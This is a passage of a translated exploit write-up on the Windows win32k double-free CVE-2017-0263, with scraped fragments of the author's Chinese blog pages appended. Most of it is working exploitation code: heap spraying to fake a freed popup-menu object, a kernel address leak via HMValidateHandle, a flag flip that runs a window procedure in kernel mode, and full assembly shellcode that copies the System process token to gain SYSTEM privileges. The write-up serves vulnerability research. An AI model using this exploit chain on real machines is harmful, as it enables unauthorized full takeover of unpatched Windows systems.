calls function  xxxMNEndMenuState  in function  xxxUnlockMenuState  at last.

  bZeroLock = menuState->dwLockCount-- == 1;
  if ( bZeroLock && ExitMenuLoop(menuState, menuState->pGlobalPopupMenu) )
  {
    xxxMNEndMenuState(1);
    result = 1;
  }

Function xxxUnlockMenuState calls xxxMNEndMenuState

This results in the retouching of the location where the vulnerability is

located and the root popup menu object pointed to by field  pGlobalPopupMe
nu  of menu state object would be double-freed, which leads to BSOD of the

operating system.

Double-free of root popup menu leads to BSOD

0x4 Exploitation

The previous sections analyze the vulnerability principle and construct a

simple triggering proof code of the vulnerability. In this section we will

exploit the vulnerablitiy, constructing exploitation code in a step-by-step

manner, to achieve exploitation and elevation of privilege at the end.

Initialize Exploitation Data

In the exploitation code we define a custom structure  SHELLCODE  to store
exploitation-related data:

typedef struct _SHELLCODE {
    DWORD reserved;
    DWORD pid;
    DWORD off_CLS_lpszMenuName;
    DWORD off_THREADINFO_ppi;
    DWORD off_EPROCESS_ActiveLink;
    DWORD off_EPROCESS_Token;
    PVOID tagCLS[0x100];

    BYTE  pfnWindProc[];
} SHELLCODE, *PSHELLCODE;

Definition of custom structure SHELLCODE

Allocate a whole page size  RWX  memory block as a  SHELLCODE  object in

user process at the beginning of exploitation code and initialize the fields,

then copy the function code of Shellcode to the memory based from the

address of field  pfnWindProc .

pvShellCode = (PSHELLCODE)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PA
if (pvShellCode == NULL)
{
    return 0;
}
ZeroMemory(pvShellCode, 0x1000);
pvShellCode->pid = GetCurrentProcessId();
pvShellCode->off_CLS_lpszMenuName    = 0x050;
pvShellCode->off_THREADINFO_ppi      = 0x0b8;
pvShellCode->off_EPROCESS_ActiveLink = 0x0b8;
pvShellCode->off_EPROCESS_Token      = 0x0f8;
CopyMemory(pvShellCode->pfnWindProc, xxPayloadWindProc, sizeof(xxPayloadWindProc)

Initialize allocated SHELLCODE structure memory

The memory area base from field  pfnWindProc  would be the practical

Sellcode function code to be executed in the kernel context.

Fake Popup Object

During the execution of custom shadow window message procedure  xxSha
dowWindowProc  in exploitation code, it is necessary to allocate muptiple

memory buffers of the same size as  tagPOPUPMENU  structure to occupy the

memory space freed just now in the kernel by calling some related

functions, in order to fake a new popup menu object to make the system

believe that the root popup menu object is still in the kernel.

It can be achieved by calling function  SetClassLong  to set field  MENUNAME

for a number of common window objects. These window objcts should be

created and initialized before the first time calling function  TrackPopupMenu

Ex .

Looking back to the location of creating menu objects before calling function

TrackPopupMenuEx , we add statements that calls function  CreateWindowEx

 to create a number of common window object, and register independent

window class for each window object.

for (INT i = 0; i < 0x100; ++i)
{
    WNDCLASSEXW Class = { 0 };
    WCHAR szTemp[20] = { 0 };
    HWND hwnd = NULL;
    wsprintfW(szTemp, L"%x-%d", rand(), i);
    Class.cbSize        = sizeof(WNDCLASSEXW);
    Class.lpfnWndProc   = DefWindowProcW;
    Class.cbWndExtra    = 0;
    Class.hInstance     = GetModuleHandleA(NULL);
    Class.lpszMenuName  = NULL;
    Class.lpszClassName = szTemp;
    RegisterClassExW(&Class);
    hwnd = CreateWindowExW(0, szTemp, NULL, WS_OVERLAPPED,
        0,
        0,
        0,
        0,
        NULL,
        NULL,
        GetModuleHandleA(NULL),
        NULL);
    hWindowList[iWindowCount++] = hwnd;
}

Exploitation code of creating mupltiple common window object

Then add statements to set field  GCL_MENUNAME  for the common window
created in batch previously before calling system service  NtUserMNDragLea
ve  in custom shadow window message procedure  xxShadowWindowProc :

DWORD dwPopupFake[0xD] = { 0 };
dwPopupFake[0x0] = 0x00098208;  //->flags
dwPopupFake[0x1] = 0xDDDDDDDD;  //->spwndNotify
dwPopupFake[0x2] = 0xDDDDDDDD;  //->spwndPopupMenu
dwPopupFake[0x3] = 0xDDDDDDDD;  //->spwndNextPopup
dwPopupFake[0x4] = 0xDDDDDDDD;  //->spwndPrevPopup
dwPopupFake[0x5] = 0xDDDDDDDD;  //->spmenu
dwPopupFake[0x6] = 0xDDDDDDDD;  //->spmenuAlternate
dwPopupFake[0x7] = 0xDDDDDDDD;  //->spwndActivePopup

dwPopupFake[0x8] = 0xDDDDDDDD;  //->ppopupmenuRoot
dwPopupFake[0x9] = 0xDDDDDDDD;  //->ppmDelayedFree
dwPopupFake[0xA] = 0xDDDDDDDD;  //->posSelectedItem
dwPopupFake[0xB] = 0xDDDDDDDD;  //->posDropped
dwPopupFake[0xC] = 0;
for (UINT i = 0; i < iWindowCount; ++i)
{
    SetClassLongW(hWindowList[i], GCL_MENUNAME, (LONG)dwPopupFake);
}

Exploitation code of setting MENUNAME for common window objects

Since field  MENUNAME  belongs to zero terminated  WCHAR  string format, it is

necessary to set the whole buffer without zero in two continuous bytes.

When setting field  MENUNAME  for target window objects by calling  SetClass

Long , the system ultimately allocates and sets  UNICODE  string buffer for

field  lpszMenuName  of the window class  tagCLS  objects belonged to by
the window objects in the kernel.

Since both the buffer pointed to by field  lpszMenuName  and the buffer of

popup menu  tagPOPUPMENU  object are process quota memory blocks, the

sizes of their extra memories are the same. It is just needed to make the

length of  MENUNAME  buffers set for each window object the same as the

size of  tagPOPUPMENU  then in normal conditions there will be always a

window class object whose  MENUNAME  buffer would be allocated in the

memory area of the previously freed root popup menu object to be the fake

popup menu  tagPOPUPMENU  object.

Occupy memory of original root popup menu object by setting

GCL_MENUNAME

It is necessary to make a little settings to field  flags  of the fake object in
order to so that system service  NtUserMNDragLeave  called later is able to

reenter function  xxxMNEndMenuState  according to the fake root popup

menu object.

kd> dt win32k!tagPOPUPMENU 0141fb44
   [...]
   +0x000 fIsTrackPopup    : 0y1
   [...]
   +0x000 fFirstClick      : 0y1
   [...]
   +0x000 fDestroyed       : 0y1
   +0x000 fDelayedFree     : 0y1
   [...]
   +0x000 fInCancel        : 0y1
   [...]
   +0x004 spwndNotify      : 0xdddddddd tagWND
   +0x008 spwndPopupMenu   : 0xdddddddd tagWND
   +0x00c spwndNextPopup   : 0xdddddddd tagWND
   +0x010 spwndPrevPopup   : 0xdddddddd tagWND
   +0x014 spmenu           : 0xdddddddd tagMENU
   +0x018 spmenuAlternate  : 0xdddddddd tagMENU
   +0x01c spwndActivePopup : 0xdddddddd tagWND
   +0x020 ppopupmenuRoot   : 0xdddddddd tagPOPUPMENU
   +0x024 ppmDelayedFree   : 0xdddddddd tagPOPUPMENU
   +0x028 posSelectedItem  : 0xdddddddd
   +0x02c posDropped       : 0xdddddddd

Field data of fake tagPOPUPMENU object

Fake Fields of Popup Menu Object

The previously faked  tagPOPUPMENU  object reoccupies the memory area of
the previously freed root popup menu object, and its each field can be fully

controlled in exploitation code. However, there is no validity setting for each

of the pointer member fields, and in this way, unlocking objects pointed to

by pointer fields in function  xxxMNEndMenuState  will still raises errors such

as page fault. The next step is to set pointer fields to point to valid memory

spaces so that the kernel logic can be executed normally.

Looking back to the location where the owner window object  hWindowMain

is being created in proof code, we add statements that creates new

common window object  hWindowHunt  as the exploitation carrier:

WNDCLASSEXW wndClass = { 0 };
wndClass = { 0 };
wndClass.cbSize = sizeof(WNDCLASSEXW);
wndClass.lpfnWndProc    = DefWindowProcW;
wndClass.cbWndExtra     = 0x200;
wndClass.hInstance      = GetModuleHandleA(NULL);
wndClass.lpszMenuName   = NULL;
wndClass.lpszClassName  = L"WNDCLASSHUNT";
RegisterClassExW(&wndClass);
hWindowHunt = CreateWindowExW(0x00,
    L"WNDCLASSHUNT",
    NULL,
    WS_OVERLAPPED,
    0,
    0,
    1,
    1,
    NULL,
    NULL,
    GetModuleHandleA(NULL),
    NULL);

Exploitation code of creating carrier window object

Carrier window object  hWindowHunt  has an extra area  0x200  bytes big
following the basic object, used to fake various related user objects in

exploitation code to enable the execution flow to execute normally and

steadily during the system reexecuting function  xxxMNEndMenuState .

Then we retrieve the kernel address of the carrier window  tagWND  object

by  HMValidateHandle  kernel object address leak technique. The head

structure of window object  tagWND  is a  THRDESKHEAD  member structure

object, whose complete definition is as below:

typedef struct _HEAD {
    HANDLE  h;
    DWORD   cLockObj;
} HEAD, *PHEAD;
typedef struct _THROBJHEAD {
    HEAD    head;
    PVOID   pti;
} THROBJHEAD, *PTHROBJHEAD;
typedef struct _DESKHEAD {
    PVOID   rpdesk;
    PBYTE   pSelf;

} DESKHEAD, *PDESKHEAD;
typedef struct _THRDESKHEAD {
    THROBJHEAD  thread;
    DESKHEAD    deskhead;
} THRDESKHEAD, *PTHRDESKHEAD;

Definition of structure THRDESKHEAD

Field  pSelf  of structure  DESKHEAD  points to the kernel address of the user

object that it belongs to. Therefore, we can locate the kernel address of

extra area of current window object according to the pointer and the size of

tagWND  structure.

According to the analysis of code, it would be known that function  xxxMNEnd

MenuState  calls function  MNEndMenuStateNotify  at the beginning to clean

up field  pMenuState  of the notification thread in case that the notification

thread is different between the current thread. However, unfortunately,
since the fake  tagPOPUPMENU  object has covered the original data, we

need to continue to fake other user objects including notification window

object.

PTHRDESKHEAD head = (PTHRDESKHEAD)xxHMValidateHandle(hWindowHunt);
PBYTE pbExtra = head->deskhead.pSelf + 0xb0 + 4;
pvHeadFake = pbExtra + 0x44;
for (UINT x = 0; x < 0x7F; x++) // 0x04~0x1FC
{
    SetWindowLongW(hWindowHunt, sizeof(DWORD) * (x + 1), (LONG)pbExtra);
}
PVOID pti = head->thread.pti;
SetWindowLongW(hWindowHunt, 0x50, (LONG)pti); // pti

Exploitation code of filling extra aree of carrier window object

Then reserve  4  bytes for the extra area of carrier window object, and fill
the remaining  0x1FC  bytes memory area with the address of the extra area

with  +0x04  bytes offset. The value filled with will be as the fields of various

fake objects such as handle values, reference counts and object pointers.

As a fake head structure of user object, the address of the remaining

memory area with  +0x44  bytes offset  pvHeadFake  would be the values of
various pointer fields of the fake root popup menu  tagPOPUPMENU  object.

The original exploitation code of initializing  MENUNAME  buffer is replaced in

the custom shadow window message procedure  xxxShadowWindowProc :

DWORD dwPopupFake[0xD] = { 0 };
dwPopupFake[0x0] = (DWORD)0x00098208;  //->flags
dwPopupFake[0x1] = (DWORD)pvHeadFake;  //->spwndNotify
dwPopupFake[0x2] = (DWORD)pvHeadFake;  //->spwndPopupMenu
dwPopupFake[0x3] = (DWORD)pvHeadFake;  //->spwndNextPopup
dwPopupFake[0x4] = (DWORD)pvHeadFake;  //->spwndPrevPopup
dwPopupFake[0x5] = (DWORD)pvHeadFake;  //->spmenu
dwPopupFake[0x6] = (DWORD)pvHeadFake;  //->spmenuAlternate
dwPopupFake[0x7] = (DWORD)pvHeadFake;  //->spwndActivePopup
dwPopupFake[0x8] = (DWORD)0xFFFFFFFF;  //->ppopupmenuRoot
dwPopupFake[0x9] = (DWORD)pvHeadFake;  //->ppmDelayedFree
dwPopupFake[0xA] = (DWORD)0xFFFFFFFF;  //->posSelectedItem
dwPopupFake[0xB] = (DWORD)pvHeadFake;  //->posDropped
dwPopupFake[0xC] = (DWORD)0;

Updated exploitation code of initializing MENUNAME buffer

Exceptionally, field  ppopupmenuRoot  and  posSelectedItem  are filled with

0xFFFFFFFF  to prevent the execution flow from being misguided. Since the

corresponding field  cLockObj  in the memory area where the fake object

head pointer  pvHeadFake  points holds a huge number, neither the
unlocking nor the dereferencing statements to the target fake object is

sufficient to make the system to call object destroying routine for the fake

object, so that the exception would not occur.

During the second execution of function  xxxMNEndMenuState , the fake root

popup menu  tagPOPUPMENU  object allocated at the original address is freed

in function  MNFreePopup .

Kernel Object Address Leak Technique

HMValidateHandle  kernel address leak technique is used in this analysis.

in  user32  module, in operating some user objects, in order to lift efficiency

to get data of user objects directly in the user mode, the system provides
unexported function  HMValidateHandle  for the internal use.

This function receives the user handle and object type as parameters, and

validate them internally. If the validation is passed, the function returns with

the address mapped in the desktop heap of the target object. This function

is not been exported, but called in some exported functions, such as  IsMen

u  function, which is used to verify whether the parameter is a menu handle

by passing the handle value and menu type enumeration value  2 ( TYPE_ME

NU ) into  HMValidateHandle  function and judgeing whether the return value

is non-zero.

.text:76D76F0E 8B FF          mov     edi, edi
.text:76D76F10 55             push    ebp
.text:76D76F11 8B EC          mov     ebp, esp
.text:76D76F13 8B 4D 08       mov     ecx, [ebp+hMenu]
.text:76D76F16 B2 02          mov     dl, 2
.text:76D76F18 E8 73 5B FE FF call    @HMValidateHandle@8 ; HMValidateHandle(x,x)
.text:76D76F1D F7 D8          neg     eax
.text:76D76F1F 1B C0          sbb     eax, eax
.text:76D76F21 F7 D8          neg     eax
.text:76D76F23 5D             pop     ebp
.text:76D76F24 C2 04 00       retn    4

Instruction fragment of function IsMenu

Therefore, we can find and calculate the address of function  HMValidateHa
ndle  from function  IsMenu  exported by  user32  module by matching

hardcode.

static PVOID(__fastcall *pfnHMValidateHandle)(HANDLE, BYTE) = NULL;
VOID
xxGetHMValidateHandle(VOID)
{
    HMODULE hModule = LoadLibraryA("USER32.DLL");
    PBYTE pfnIsMenu = (PBYTE)GetProcAddress(hModule, "IsMenu");
    PBYTE Address = NULL;
    for (INT i = 0; i < 0x30; i++)
    {
        if (*(WORD *)(i + pfnIsMenu) != 0x02B2)
        {
            continue;
        }
        i += 2;
        if (*(BYTE *)(i + pfnIsMenu) != 0xE8)
        {
            continue;
        }
        Address = *(DWORD *)(i + pfnIsMenu + 1) + pfnIsMenu;
        Address = Address + i + 5;
        pfnHMValidateHandle = (PVOID(__fastcall *)(HANDLE, BYTE))Address;
        break;
    }
}

Exploitation code of finding address of HMValidateHandle

After Having located the target function, add calling statements to this

function at the right time it is needed to retrieve kernel addresses of user

objects such as window object in exploitation code. When the called

function succeeds, it returns with the address mapped in the desktop heap

of the target object.

#define TYPE_WINDOW 1
PVOID
xxHMValidateHandleEx(HWND hwnd)
{
    return pfnHMValidateHandle((HANDLE)hwnd, TYPE_WINDOW);
}

Exploitation code of retrieving target object mapped address

The head structure of window object  tagWND  is a  THRDESKHEAD  member
structure object, where there is a sub field  pSelf  pointing to the kernel

address of the window object that it belongs to.

Code Execution in Kernel-Mode

Member flag bit  bServerSideWindowProc  is the  18  bit of the flag field of  t
agWND  object, which following two other flag bits  bDialogWindow  and  bHas

CreatestructName :

kd> dt win32k!tagWND
   +0x000 head             : _THRDESKHEAD
   +0x014 state            : Uint4B
   [...]
   +0x014 bDialogWindow    : Pos 16, 1 Bit
   +0x014 bHasCreatestructName : Pos 17, 1 Bit
   +0x014 bServerSideWindowProc : Pos 18, 1 Bit

The position of flag bit  bDialogWindow  is the beginning bit in the bytes
where  bServerSideWindowProc  is located. When a common window object

is being created, if the style parameter  dwStyle  and extended style
parameter  dwExStyle  is passed as  0  default value, both these three flag

bits would have not been set. Therefore, we can achieve the setting to the

target cratical flag bit with this feature.

Statement of retrieving the address of member flag bit  bDialogWindow  of

the window object by the kernel address leak technique should be added

during filling the extra area of carrier window object in exploitation code:

pvAddrFlags = *(PBYTE *)((PBYTE)xxHMValidateHandle(hWindowHunt) + 0x10) + 0x16;

Then we set the message procedure field of carrier window object  hWindow

Hunt  as the beginning address of field  pfnWindProc  of the structure  SHEL

LCODE  object initialized previously:

SetWindowLongW(hWindowHunt, GWL_WNDPROC, (LONG)pvShellCode->pfnWindProc);

When initializing the data of  MENUNAME  niffer in the custom shadow window
message procedure  xxxShadowWindowProc , the address of flag bit  bDialo

gWindow  with  -0x04  bytes offset should be the value of one of window

object pointer fields （such as  spwndPrevPopup  field） of the fake  tagPOP
UPMENU  object, in order to make the aforementioned three flag bits to be the

lowest three bits of field  cLockObj  of the "window object" pointed to by the

target pointer field:

dwPopupFake[0x4] = (DWORD)pvAddrFlags - 4; //->spwndPrevPopup

During the execution of function  xxxMNEndMenuState , when calling  HMAssi
gnmentUnlock  for field  spwndPrevPopup  of root popup menu object to

unlock the assignment lock to the target window object, the system

decrements the data at the address based from flag bit  bDialogWindow

directly, which caused flag bit  bServerSideWindowProc  being set.

Set target flag bit by dec instruction

With member flag bit  bServerSideWindowProc  being set, carrier window
object would get the ability to directly execute window message procedure

in the kernel context.

ShellCode

The code of ShellCode function would be executed directly in the kernel

context as the custom message procedure of carrier window object. Before

constrcuting the code of ShellCode function, it is necessary to initialize and

assign the needed data at first.

According to the exploitation code constructed before, we have achieved

the aim that the system is able to execute placidly without any exception

during the second execution of function  xxxMNEndMenuState  when the
vulnerablity is being triggered. However, the freed root popup menu object

at the second time is in fact the buffer pointed to by field  lpszMenuName  of

one of the window class  tagCLS  objects registered in batch previously. If

the buffer has been freed in advance, when the process exiting, during

destroying various user objects, the attempt to free the freed memory

pointed to by the target field  lpszMenuName  would cause a double-free

exception. Therefore, it is must to zero the target field  lpszMenuName  which
points to a freed memory block in the code of ShellCode.

During creating common window objects in batch, it is needed to add

statements of retrieving the address pointed by field  pcls  of each window

object and storing the addresses into member array  tagCLS[]  of the

structure  SHELLCODE  object.

static constexpr UINT num_offset_WND_pcls = 0x64;
for (INT i = 0; i < iWindowCount; i++)
{
    pvShellCode->tagCLS[i] = *(PVOID *)((PBYTE)xxHMValidateHandle(hWindowList[i])
}

Expoitation code of recording addresses of tagCLS

It is needed to match fields  lpszMenuName  with the kernel address of root
popup menu object to find the target window class object whose field  lpszM

enuName  needs to be zeroed. Therefore, exploitation code needs to retrieve

the kernel address of root popup menu in user process, which can be

realized in event notification procedure  xxWindowEventProc :

VOID CALLBACK
xxWindowEventProc(
    HWINEVENTHOOK hWinEventHook,
    DWORD         event,
    HWND          hwnd,
    LONG          idObject,
    LONG          idChild,
    DWORD         idEventThread,
    DWORD         dwmsEventTime
)
{
    if (iMenuCreated == 0)
    {
        popupMenuRoot = *(DWORD *)((PBYTE)xxHMValidateHandle(hwnd) + 0xb0);
    }
    if (++iMenuCreated >= 2)
    {
        SendMessageW(hwnd, MN_ENDMENU, 0, 0);
    }
    else
    {
        SendMessageW(hwnd, WM_LBUTTONDOWN, 1, 0x00020002);
    }
}

Add exploitation code of retrieving address of root popup menu

When initializing the buffer of structure  SHELLCODE  object at the beginning

of exploitation code, the code of exploitation function  xxPayloadWindProc

is copied into the buffer of  SHELLCODE  object. The next step is to realize the

construction of the code of function  xxPayloadWindProc . The code of this

function would be executed in the kernel context as the kernel-mode

message procedure of carrier window object. It is slightly different from

window message procedure executed in the user context that the first

parameter of kernel-mode message procedure is a pointer to the target

window object, and the remaining parameters are all the same.

In order to exactly identify the actions to trigger the elevation of privilege,  0

x9F9F  is defined as the message to trigger. In the code of ShellCode

function, we judge whether the incoming message parameter is the custom

message to trigger defined by us:

push    ebp
mov     ebp,esp
mov     eax,dword ptr [ebp+0Ch]
cmp     eax,9F9Fh
jne     LocFAILED

In 32-bit Windows operating system, code segment register  CS  always
holds  0x1B . According to this feature, we judge whether the current

execution context is in user-mode in ShellCode function, if so just return.

mov     ax,cs
cmp     ax,1Bh
je      LocFAILED

Restore the member flag bits of carrier window object to the original value.

Contrary to the case when modifying flag bits previously, Incrementing the
data at the address based from flag bit  bDialogWindow  directly at present
would causes that flags bits modified before such as  bServerSideWindowPr

oc  are restored to the previous state before modification.

cld
mov     ecx,dword ptr [ebp+8]
inc     dword ptr [ecx+16h]

Backup of all the general registers to the stack is needed at present, which

followed by retrieving the value of register  EIP  by  CALL-POP  technique

and calculating the base address of the structure  SHELLCODE  stored in front

of the code of ShellCode function according to the relative offset:

pushad
call    $5
pop     edx
sub     edx,443h

Traverse the array holding pointers to  tagCLS  in structure  SHELLCODE  and
match with the address of root popup menu object from parameter  wParam .

If found, just zero field  lpszMenuName  of the matched window class object.

mov     ebx,100h
lea     esi,[edx+18h]
mov     edi,dword ptr [ebp+10h]

LocForCLS:
test    ebx,ebx
je      LocGetEPROCESS
lods    dword ptr [esi]
dec     ebx
cmp     eax,0
je      LocForCLS
add     eax,dword ptr [edx+8]
cmp     dword ptr [eax],edi
jne     LocForCLS
and     dword ptr [eax],0
jmp     LocForCLS

The next step is to retrieve the pointer to thread information  tagTHREADINFO

 object from the head structure of carrier window object, and to get the

pointer to process information  tagPROCESSINFO  object stored in thread

information object. Then we get the pointer of  EPROCESS  object of the

corresponding process from process information object. The offsets of each

field are held by  SHELLCODE  object.

LocGetEPROCESS:
mov     ecx,dword ptr [ecx+8]
mov     ebx,dword ptr [edx+0Ch]
mov     ecx,dword ptr [ebx+ecx]
mov     ecx,dword ptr [ecx]

mov     ebx,dword ptr [edx+10h]
mov     eax,dword ptr [edx+4]

Then find the address of  EPROCESS  object according to field  ActiveProces

sLinks  and field  UniqueProcessId  of  EPROCESS  object. Since field  Uniqu

eProcessId  is just followed by field  ActiveProcessLinks , we can locate

each  UniqueProcessId  field through the offset of  ActiveProcessLinks

held by  SHELLCODE  object.

push    ecx

LocForCurrentPROCESS:
cmp     dword ptr [ebx+ecx-4],eax
je      LocFoundCURRENT
mov     ecx,dword ptr [ebx+ecx]
sub     ecx,ebx
jmp     LocForCurrentPROCESS

LocFoundCURRENT:
mov     edi,ecx
pop     ecx

The next step is to continue traversing the linked list of  EPROCESS  objects

to find the  EPROCESS  object of system process.

LocForSystemPROCESS:
cmp     dword ptr [ebx+ecx-4],4
je      LocFoundSYSTEM
mov     ecx,dword ptr [ebx+ecx]
sub     ecx,ebx
jmp     LocForSystemPROCESS

LocFoundSYSTEM:
mov     esi,ecx

It means that both the  EPROCESS  objects of current process and system
process are located when executing here, then the value of field  Token  of

current process would be replaced by the one of system process.

mov     eax,dword ptr [edx+14h]
add     esi,eax
add     edi,eax

lods    dword ptr [esi]
stos    dword ptr es:[edi]

At this moment while the current process has already owned and pointed to

the  Token  object of system process, the reference count of target  Token

object needs a manual correction because of the extra added reference.

Most of kernel objects use a structure  OBJECT_HEADER  as their header

structures in NT executive:

kd> dt nt!_OBJECT_HEADER
   +0x000 PointerCount     : Int4B
   +0x004 HandleCount      : Int4B
   [...]
   +0x014 SecurityDescriptor : Ptr32 Void
   +0x018 Body             : _QUAD

This structure is followed by the associated kernel object, which holds the

kernel object from the address of its field  Body . Manual increment of
reference needs to modify field  PointerCount .

and     eax,0FFFFFFF8h
add     dword ptr [eax-18h],2

Most of work is done. Restore the values of general registers backed up
previously to the registers, and return to the caller with  0x9F9F  as the
feedback information.

popad
mov     eax,9F9Fh
jmp     LocRETURN

LocFAILED:
mov     eax,1

LocRETURN:
leave
ret     10h

The ShellCode function code has been written completely.

Trigger Elevation of Privilege

Everything is ready except the east wind. The latest statements are placed

following the statement of calling system service  NtUserMNDragLeave  in

the custom shadow window message procedure  xxShadowWindowProc ,

which are of sending custom message  0x9F9F  with the kernel address of
root popup menu object as parameter  wParam  and storing the judging

result of the returned value into the global variable  bDoneExploit .

LRESULT Triggered = SendMessageW(hWindowHunt, 0x9F9F, popupMenuRoot, 0);
bDoneExploit = Triggered == 0x9F9F;

As thus, following the call to system service  NtUserMNDragLeave  to set flag
bit  bServerSideWindowProc  of carrier window object, the function sends

custom message  0x9F9F  with the kernel address of root popup menu

object as parameter  wParam . The execution flow would invoke the custom
message procedure of carrier window object in the kernel context and enter

the code of ShellCode defined by user process, which achieves the

elevation of privilege and the repair to fields of the related user objects.

Global variable  bDoneExploit  is listened to be assigned by the main
thread; if so, the main thread would create a new command prompt

process.

Newly created process belongs to System identity

It can be observed that the newly created command prompt process has

belonged to System user identity.

Postscript

There are some slight differences between the logic of exploitation code in

this analysis and the part in the original attacking sample. For example, in

order to make sure a reasonable success rate, the attacking sample

performed operations to suspend all the threads temporarily in the system,

and created three menu object to exploit, as well as retry mechanism, etc.

In this analysis, to achieve the simplest proof and exploitation code, these

unnecessary factors are omitted.

0x5 Links

Translated from my Chinese article: https://xiaodaozhi.com/exploit/71.html

[0] The proof of concept of this analysis

https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/

CVE-2017-0263/x86.cpp

[1] Kernel Attacks through User-Mode Callbacks

http://media.blackhat.com/bh-us-11/Mandt/

BH_US_11_Mandt_win32k_WP.pdf

[2] 从 Dump 到 POC 系列一: Win32k 内核提权漏洞分析

http://blogs.360.cn/blog/dump-to-poc-to-win32k-kernel-privilege-escalation-

vulnerability/

[3] TrackPopupMenuEx function (Windows)

https://msdn.microsoft.com/en-us/library/windows/desktop/ms648003

(v=vs.85).aspx

[4] sam-b/windows_kernel_address_leaks

https://github.com/sam-b/windows_kernel_address_leaks

[5] Sednit adds two zero-day exploits using 'Trump's attack on Syria' as a

decoy

https://www.welivesecurity.com/2017/05/09/sednit-adds-two-zero-day-

exploits-using-trumps-attack-syria-decoy/

[6] EPS Processing Zero-Days Exploited by Multiple Threat Actors

https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-

days.html



=== Content from xiaodaozhi.com_ecb9b685_20250126_091021.html ===

小刀志
[首页](/ "首页 home")
[归档](https://xiaodaozhi.com/archives.html "归档 archives")
[标签](https://xiaodaozhi.com/tags.html "标签 tags")
[链接](https://xiaodaozhi.com/links.html "链接 links")
[我是谁](https://xiaodaozhi.com/who-am-i.html "我是谁 whoami")

![小刀志](/img/author.png)
小刀志

稻草小刀的在线笔记。记录所有事情，并写给自己。

搜索关键字

# 链接

**[小刀志](https://xiaodaozhi.com/)**

> 稻草小刀的在线笔记。记录所有事情，并写给自己。

**[360 blogs](http://blogs.360.cn/)**

> 360 核心安全技术博客。

**[wjllz](https://redogwu.github.io/)**

> wjllz 的个人博客。

### 有 3 条评论

1. ![霸气侧漏洞](//ixnet.icu/avatar/047fe66e8022355ad17c12ddbf1fa156?s=32&r=G&d=mm)
   **霸气侧漏洞**
   2020-06-30 14:17 #124
   [回复](https://xiaodaozhi.com/links.html?replyTo=124#respond-page-16)

   你的这个界面挺简洁美观的，是自己开发的吗？

   1. ![Leeqwind](//ixnet.icu/avatar/f585929a3a7de3e707639a048fff1324?s=32&r=G&d=mm)
      **Leeqwind**
      2020-06-30 14:38 #125 -> [#124](#comment-124)
      [回复](https://xiaodaozhi.com/links.html?replyTo=125#respond-page-16)

      以一个默认模板为基础，按照自己的想法大改的。
2. ![一个信安的菜鸟](//ixnet.icu/avatar/7ef1d32c072ce182f49d67cf1912931d?s=32&r=G&d=mm)
   **一个信安的菜鸟**
   2020-07-10 11:50 #126
   [回复](https://xiaodaozhi.com/links.html?replyTo=126#respond-page-16)

   小刀师傅，对于公告中阐述不明的漏洞，一般是通过补丁对比来进行深入挖掘。我现在尝试使用BinDiff进行对比。想问一下BinDiff是否能自定义primary function和secondary function来进行对比。因为我发现它找到的函数有点问题

内容

* 发表评论

© 2025 [小刀志](https://xiaodaozhi.com/)
*·* [网站地图](https://xiaodaozhi.com/sitemap.xml)
*·* [许可声明](https://xiaodaozhi.com/license.html)
*·* [京ICP备18017134号-1](https://beian.miit.gov.cn/) *·* 京公网安备11010502035375号

* 文章目录

---



=== Content from portal.msrc.microsoft.com_c635162e_20250125_135323.html ===
You need to enable JavaScript to run this app.

=== Content from xiaodaozhi.com_edc893a0_20250126_091001.html ===

小刀志
[首页](/ "首页 home")
[归档](https://xiaodaozhi.com/archives.html "归档 archives")
[标签](https://xiaodaozhi.com/tags.html "标签 tags")
[链接](https://xiaodaozhi.com/links.html "链接 links")
[我是谁](https://xiaodaozhi.com/who-am-i.html "我是谁 whoami")

![小刀志](/img/author.png)
小刀志

稻草小刀的在线笔记。记录所有事情，并写给自己。

搜索关键字

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-05-11

[Win32k NULL-Pointer-Dereference Analysis by Matching the May Update](https://xiaodaozhi.com/exploit/156.html)
Microsoft shipped and fixed four win32k kernel Escalation of Privilege vulnerabilities in the May security bulletin. ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [78682](https://xiaodaozhi.com/exploit/156.html)
* [1](https://xiaodaozhi.com/exploit/156.html#comments)
* 28

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-05-09

[通过对比 5 月补丁分析 win32k 空指针解引用漏洞](https://xiaodaozhi.com/exploit/149.html)
微软在 5 月安全公告中包含并修复了 4 个 win32k 内核提权漏洞。这篇文章将通过补丁对比的方式，发现并分析补丁程序中修复的一个由某处空指针解引用导致的提权漏洞，最终实现其验证和利用代码。分析和调试的过程将在 Windows ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [48111](https://xiaodaozhi.com/exploit/149.html)
* [3](https://xiaodaozhi.com/exploit/149.html#comments)
* 10

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-05-09

[对 UAF 漏洞 CVE-2016-0167 的分析和利用](https://xiaodaozhi.com/exploit/135.html)
这篇文章将对 Windows 释放后重用（UAF）内核漏洞 CVE-2016-0167 进行一次简单的分析并构造其利用验证代码。该漏洞在 2016 年据报道称被用于攻击支付卡等目标的数据，并和之前分析的 CVE-2016-0165 ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [46863](https://xiaodaozhi.com/exploit/135.html)
* [8](https://xiaodaozhi.com/exploit/135.html#comments)
* 6

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-04-22

[CVE-2015-2546 UAF Analysis and Exploitation](https://xiaodaozhi.com/exploit/132.html)
This article will analyze a UAF vulnerability in win32k Window Manager (User) Subsystem in Windows: CVE-2015-2546. S ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [38327](https://xiaodaozhi.com/exploit/132.html)
* [0](https://xiaodaozhi.com/exploit/132.html#comments)
* 2

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-04-18

[对 UAF 漏洞 CVE-2015-2546 的分析和利用](https://xiaodaozhi.com/exploit/122.html)
